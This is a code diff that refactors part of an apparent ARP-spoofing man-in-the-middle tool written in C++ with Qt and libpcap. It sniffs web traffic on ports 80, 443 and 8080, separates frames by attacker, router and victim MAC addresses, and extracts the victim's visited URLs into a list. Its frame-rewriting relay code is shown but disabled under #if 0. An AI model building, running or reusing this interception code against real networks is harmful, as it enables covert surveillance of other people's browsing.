@@ -1,9 +1,6 @@
 #include "relay_spoof.h"
 #include <QCoreApplication>
 
-void get_mac_filter(char *get, u_char *my);
-int flag_check_get(u_char *a, u_char *b);
-//void get_print_packet(int len, u_char *packet);
 void getUrl(u_char *packet, int len);
 void sendUrl(u_char *packet, int len);
 
@@ -19,7 +16,7 @@ relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {
 }
 
 void relay_spoof::run() {
-    int cnt = 0, i = 0;
+    int cnt = 0;
     bpf_u_int32 netp, maskp;
     struct bpf_program filter;
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -32,9 +29,9 @@ void relay_spoof::run() {
     if(pcap_compile(spoofPcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
     if(pcap_setfilter(spoofPcap, &filter) == -1) exit(1);
 
-    get_mac_filter(relayAtkMac.toLatin1().data(), spoofAtkMac);
-    get_mac_filter(relayRouterMac.toLatin1().data(), spoofRouterMac);
-    get_mac_filter(relayVictimMac.toLatin1().data(), spoofVictimMac);
+    pre_filter(relayAtkMac.toLatin1().data(), spoofAtkMac, ETHER_ADDR_LEN, "upper");
+    pre_filter(relayRouterMac.toLatin1().data(), spoofRouterMac, ETHER_ADDR_LEN, "upper");
+    pre_filter(relayVictimMac.toLatin1().data(), spoofVictimMac, ETHER_ADDR_LEN, "upper");
 
     spoofStop = false;
 
@@ -42,30 +39,32 @@ void relay_spoof::run() {
         while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
             eth = (struct libnet_ethernet_hdr *)packet;
 
-            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) == 1 && flag_check_get(eth->ether_shost, spoofVictimMac) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
-/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
+            if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) == 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
+#if 0
+                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                     *(packet + i) = *(spoofRouterMac + i);
                     *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
                 pcap_sendpacket(spoofPcap, packet, pkthdr->len);
-//                printf("\n##### Host Get Packet #####\n");
-//                get_print_packet(pkthdr->len, packet);
-*/
+                printf("\n##### Host Get Packet #####\n");
+                print_packet(pkthdr->len, packet);
+#endif
                 getUrl(packet, pkthdr->len);
                 if(get_broad_cnt != test_cnt) {
                     emit relay_urlList(relay_url_list);
                     test_cnt++;
                 }
             }
-            if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) != 1 && flag_check_get(eth->ether_shost, spoofVictimMac) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
-/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
+            if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
+#if 0
+                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                     *(packet + i) = *(spoofVictimMac + i);
                     *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
                 pcap_sendpacket(spoofPcap, packet, pkthdr->len);
-//                printf("\n##### DNS Packet #####\n");
-//                get_print_packet(length, packet);
-*/
+                printf("\n##### DNS Packet #####\n");
+                print_packet(length, packet);
+#endif
                 sendUrl(packet, pkthdr->len);
             }
         }
@@ -75,39 +74,6 @@ void relay_spoof::run() {
     emit relay_spoofFin(true);
 }
 
-void get_mac_filter(char *get, u_char *my) {	// owner mac address save at my_mac variable
-    int i, j = 0;
-    for(i = 0; i < ETHER_ADDR_LEN; i++) {
-        if(*(get+j) < 'A') {
-            *(my+i) = (*(get+j) - '0') * 0x10;
-            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
-        }
-        else {
-            *(my+i) = (*(get+j) == 'A') ? 0xA0 : ((*(get+j) == 'B') ? 0xB0 : ((*(get+j) == 'C') ? 0xC0 : ((*(get+j) == 'D') ? 0xD0 : ((*(get+j) == 'E') ? 0xE0 : 0xF0))));
-            if(*(get+j+1) < 'A') *(my+i) += (*(get+j+1) - '0') * 0x01;
-            else *(my+i) += (*(get+j+1) == 'A') ? 0x0A : ((*(get+j+1) == 'B') ? 0x0B : ((*(get+j+1) == 'C') ? 0x0C : ((*(get+j+1) == 'D') ? 0x0D : ((*(get+j+1) == 'E') ? 0x0E : 0x0F))));
-        }
-        j += 2;
-    }
-}
-
-int flag_check_get(u_char *a, u_char *b) {	// compare with mac address
-    int value = 0;
-    value = (*a != *b ? 1 : ((*(a+1) != *(b+1)) ? 1 : ((*(a+2) != *(b+2)) ? 1 : ((*(a+3) != *(b+3)) ? 1 : ((*(a+4) != *(b+4)) ? 1 : ((*(a+5) != *(b+5)) ? 1 : -1))))));
-    return value;
-}
-/*
-void get_print_packet(int len, u_char *packet) {
-    int cnt = 0;
-    printf("\n");
-    while(len-- != 0) {
-        printf("%02x ", *(packet++));
-        if ((++cnt % 16) == 0) printf("\n");
-    }
-    printf("%02x\n", *packet);
-}
-*/
 void getUrl(u_char *packet, int len) {
     int i = 0, tmp = 0, cnt = 0, get_len = len;
     bool var = false;
